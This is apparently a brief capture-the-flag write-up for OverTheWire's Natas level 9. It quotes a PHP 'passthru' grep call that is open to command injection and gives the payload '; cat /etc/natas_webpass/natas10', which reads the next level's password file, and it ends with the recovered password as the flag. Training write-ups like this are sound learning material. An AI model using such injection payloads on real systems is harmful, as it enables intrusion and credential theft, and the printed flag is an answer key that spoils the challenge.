# Natas Level 9 Solution

in this challenge we use command injection, this is the vuln part: `passthru("grep -i $key dictionary.txt");`

and this is the payload we gives `; cat /etc/natas_webpass/natas10`

**Flag:** ***`t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`*** 